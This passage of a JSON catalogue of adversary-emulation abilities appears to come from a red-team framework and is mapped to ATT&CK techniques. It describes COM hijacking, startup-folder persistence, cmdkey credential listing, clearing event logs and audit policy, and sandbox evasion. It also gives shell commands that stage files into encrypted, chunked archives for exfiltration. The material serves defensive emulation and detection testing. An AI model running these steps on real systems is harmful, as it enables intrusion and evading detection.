    },
    {
        "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\". \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\nUpon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. ",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Component Object Model Hijacking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "COM Hijacking with RunDLL32 (Local Server Switch)",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "f204aa8bd030dab20527e2bc8a230f35",
        "technique_id": "T1546.015",
        "repeatable": false
    },
    {
        "description": "This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.\nThen, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The\ntest is validated by running 'rundll32.exe -sta \"AtomicTest\"' to avoid logging out.\n\nReferences:\n\nhttps://youtu.be/3gz1QmiMhss?t=1251\n\nhttps://github.com/enigma0x3/windows-operating-system-archaeology",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Component Object Model Hijacking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "COM hijacking via TreatAs",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "2db3b2385ba856424bfe130f69fc0529",
        "technique_id": "T1546.015",
        "repeatable": false
    },
    {
        "description": "List credentials currently stored on the host via the built-in Windows utility cmdkey.exe\nCredentials listed with Cmdkey only pertain to the current user\nPasswords will not be displayed once they are stored\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey\nhttps://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: Cached Domain Credentials",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Cached Credential Dump via Cmdkey",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "bb0df721f4a4defa743efe9e61837c44",
        "technique_id": "T1003.005",
        "repeatable": false
    },
    {
        "description": "The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\nReference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Private Keys",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "CertUtil ExportPFX",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "000549902a51ef21f57d3d28a6e5ecc0",
        "technique_id": "T1552.004",
        "repeatable": false
    },
    {
        "description": "Rename certutil and decode a file. This is in reference to latest research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Deobfuscate/Decode Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Certutil Rename and Decode",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e510c5fd2f1ea418990fcf06775bc9b4",
        "technique_id": "T1140",
        "repeatable": false
    },
    {
        "description": "Change Default File Association From cmd.exe of hta to notepad.\n\nUpon successful execution, cmd.exe will change the file association of .hta to notepad.exe. \n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Change Default File Association",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Change Default File Association",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "52b03ab57c6d0594e014da562857b49f",
        "technique_id": "T1546.001",
        "repeatable": false
    },
    {
        "description": "Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Change Powershell Execution Policy to Bypass",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0424ccb447bfa66b94162266f55ecd52",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "This test will modify the HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  -V \"Startup\" value \nto point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Change Startup Folder - HKCU Modify User Shell Folders Startup Value",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "34dfc0264e6fd27b4997fea21c0bbada",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "This test will modify the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders -V \"Common Startup\" \nvalue to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "1169b67e9f991716ba91833486f3c564",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "Changes the user password to hinder access attempts. Seen in use by LockerGoga. Upon execution, log into the user account \"AtomicAdministrator\" with\nthe password \"HuHuHUHoHo283283\".\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Access Removal",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Change User Password - Windows",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "f7e779369b3f0cff24152d7dd94eca98",
        "technique_id": "T1531",
        "repeatable": false
    },
    {
        "description": "Changing RDP Port to Non Standard Port via Command_Prompt\n",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: Remote Desktop Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Changing RDP Port to Non Standard Port via Command_Prompt",
        "tactic": "lateral-movement",
        "plugin": "atomic",
        "ability_id": "41e7255e8dc65f43482a623000773dd3",
        "technique_id": "T1021.001",
        "repeatable": false
    },
    {
        "description": "Changing RDP Port to Non Standard Port via Powershell\n",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: Remote Desktop Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Changing RDP Port to Non Standard Port via Powershell",
        "tactic": "lateral-movement",
        "plugin": "atomic",
        "ability_id": "a2a4d8a2f11ed41fe32ab1001ed78ffd",
        "technique_id": "T1021.001",
        "repeatable": false
    },
    {
        "description": "Check to see what version of python is installed",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "python3 --version;python2 --version;python --version",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Check Python",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "b18e8767-b7ea-41a3-8e80-baf65a5ddef5",
        "technique_id": "T1518",
        "repeatable": false
    },
    {
        "description": "Check for security services. Security service list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Virtualization/Sandbox Evasion: System Checks",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Check Security Services",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "1258b063-27d6-489b-a677-4807faacf868",
        "technique_id": "T1497.001",
        "repeatable": false
    },
    {
        "description": "Check for analysis/sandbox environment processes. Process black list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Virtualization/Sandbox Evasion: System Checks",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Check analysis environment processes",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "7a6ba833-de40-466a-8969-5c37b13603e0",
        "technique_id": "T1497.001",
        "repeatable": false
    },
    {
        "description": "Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.\nIf no output is displayed the test executed successfuly.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: InstallUtil",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "CheckIfInstallable method call",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c3a04ce292bc3f8615d56af548c8dec0",
        "technique_id": "T1218.004",
        "repeatable": false
    },
    {
        "description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Clear Event Logs via VBA",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "05f8b752dbccff102ef530103bd8e550",
        "technique_id": "T1070.001",
        "repeatable": false
    },
    {
        "description": "Clear Sysmon logs [intended to trigger CAR-2016-04-002]",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "Elevated",
        "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Clear Logs",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "fcf71ee3-d1a9-4136-b919-9e5f6da43608",
        "technique_id": "T1070.001",
        "repeatable": false
    },
    {
        "description": "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Clear Logs",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "3838447b079b302fe75b700a70163815",
        "technique_id": "T1070.001",
        "repeatable": false
    },
    {
        "description": "Clears Powershell history\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Command History",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Clear Powershell History by Deleting History File",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "adce11c81bb77ae74660c6c743a0442d",
        "technique_id": "T1070.003",
        "repeatable": false
    },
    {
        "description": "Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable Windows Event Logging",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Clear Windows Audit Policy Config",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6a8d25d65a7d481dc479f89c62af1e6a",
        "technique_id": "T1562.002",
        "repeatable": false
    },
    {
        "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inter-Process Communication",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Cobalt Strike Artifact Kit pipe",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "71e15fde52e9acd90c3d5a4c1826279d",
        "technique_id": "T1559",
        "repeatable": false
    },
    {
        "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inter-Process Communication",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Cobalt Strike Lateral Movement (psexec_psh) pipe",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "7c6a6ffb23e7949d5ce5b0b9dfcbd73f",
        "technique_id": "T1559",
        "repeatable": false
    },
    {
        "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inter-Process Communication",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Cobalt Strike SSH (postex_ssh) pipe",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "8afcc1dcfffe03846de54686dff957ab",
        "technique_id": "T1559",
        "repeatable": false
    },
    {
        "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inter-Process Communication",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Cobalt Strike post-exploitation pipe (4.2 and later)",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "a3a4320ad140e1046b224082cccd3be9",
        "technique_id": "T1559",
        "repeatable": false
    },
    {
        "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inter-Process Communication",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Cobalt Strike post-exploitation pipe (before 4.2)",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "7471518905b120283ba2644c9519bee2",
        "technique_id": "T1559",
        "repeatable": false
    },
    {
        "description": "Locate all active IP and FQDNs on the network",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "arp -a",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.ipaddr",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "remote.host.ip",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Collect ARP details",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\\atomic_T1115_clipboard_data.txt\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Clipboard Data",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Collect Clipboard Data via VBA",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "abd5327a47c4994e2824f833eefe4250",
        "technique_id": "T1115",
        "repeatable": false
    },
    {
        "description": "Simulate Raspberry Robin using the \"standard-in\" command prompt feature cmd `/R <` to read and execute a file via cmd.exe\nSee https://redcanary.com/blog/raspberry-robin/. \n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Command Prompt read contents from CMD file and execute",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "e71f5cb2d3a9b87877a7162c76c9a8da",
        "technique_id": "T1059.003",
        "repeatable": false
    },
    {
        "description": "Compile C# code using csc.exe binary used by .NET\nUpon execution an exe named T1027.004.exe will be placed in the temp folder\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information: Compile After Delivery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Compile After Delivery using csc.exe",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f7e29cdc63759d523fca9d6a8178daa0",
        "technique_id": "T1027.004",
        "repeatable": false
    },
    {
        "description": "Uses hh.exe to execute a local compiled HTML Help payload.\nUpon execution calc.exe will open\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Compiled HTML Help Local Payload",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "bcdc2f68450358a50f50fa89410fa122",
        "technique_id": "T1218.001",
        "repeatable": false
    },
    {
        "description": "Uses hh.exe to execute a remote compiled HTML Help payload.\nUpon execution displays an error saying the file cannot be open\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Compiled HTML Help Remote Payload",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6d5da876fe45a933257a96c14c3132f0",
        "technique_id": "T1218.001",
        "repeatable": false
    },
    {
        "description": "Note: Requires 7zip installation\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Compress Data and lock with password for Exfiltration with 7zip",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "f6b9e50c4a887e5975ec058ff9ea56ae",
        "technique_id": "T1560.001",
        "repeatable": false
    },
    {
        "description": "Note: Requires winrar installation\nrar a -p\"blue\" hello.rar (VARIANT)\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Compress Data and lock with password for Exfiltration with winrar",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "38a918787f583bb58b28ec495263d7b7",
        "technique_id": "T1560.001",
        "repeatable": false
    },
    {
        "description": "Note: Requires winzip installation\nwzzip sample.zip -s\"blueblue\" *.txt (VARIANT)\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Compress Data and lock with password for Exfiltration with winzip",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "6bab3d3a468266765c4a6f3857243136",
        "technique_id": "T1560.001",
        "repeatable": false
    },
    {
        "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory \n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Compress Data for Exfiltration With PowerShell",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "8cd2639cb742872b58a2356909628376",
        "technique_id": "T1560",
        "repeatable": false
    },
    {
        "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory \n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Compress Data for Exfiltration With Rar",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "b42bac313bde7e1641452628af72b915",
        "technique_id": "T1560.001",
        "repeatable": false
    },
    {
        "description": "This ability will compress a given git repository.",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "tar -czf #{host.dir.git}.tar.gz -C \"#{host.dir.git}\" .; printf #{host.dir.git}.tar.gz;",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [
                    "rm #{host.dir.git}.tar.gz;"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Compress Git Repository",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "2f90d4de-2612-4468-9251-b220e3727452",
        "technique_id": "T1560.001",
        "repeatable": false
    },
    {
        "description": "This ability will compress the staged files into a password protected archive and break it\ninto smaller chunks based on the given byte size. The original archive will be automatically\ndeleted. Use this instead of other archiving abilities if small file sizes for exfiltration \nare desired. When used with an exfiltration ability, the exfiltration ability will run numerous\ntimes in an operation depending on how many chunks are created. \n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Transfer Size Limits",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.staged"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase '#{host.archive.password}' > #{host.dir.staged}.tar.gz.gpg;\nsplit -b#{file.size.chunk} '#{host.dir.staged}.tar.gz.gpg' '#{host.dir.staged}'/calderachunk;\nrm '#{host.dir.staged}.tar.gz.gpg';\nfind '#{host.dir.staged}' -maxdepth 1 -name 'calderachunk*' 2>/dev/null;",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [
                    "find '#{host.dir.staged}' -maxdepth 1 -name 'calderachunk*' -exec rm -rf {} \\;"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Compress Staged Directory (Password Protected) and Split Into Smaller Chunks",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "5c5b0392-1daa-45e1-967c-2f361ce78849",
        "technique_id": "T1030",
        "repeatable": false
    },
    {
        "description": "Compress a directory on the file system",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.staged"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [
                    "rm #{host.dir.staged}.tar.gz"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Compress staged directory",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
        "technique_id": "T1560.001",
        "repeatable": false
    },
    {
        "description": "This ability packages staged files into a password-protected archive. Note - Requires 7Z for Windows and GPG version 2.1+ for Linux",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.staged"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [
                    "rm #{host.dir.staged}.tar.gz.gpg"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Compress staged directory (Password Protected)",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "30a8cf10-73dc-497c-8261-a64cc9e91505",
        "technique_id": "T1560.001",
        "repeatable": false
    },
    {
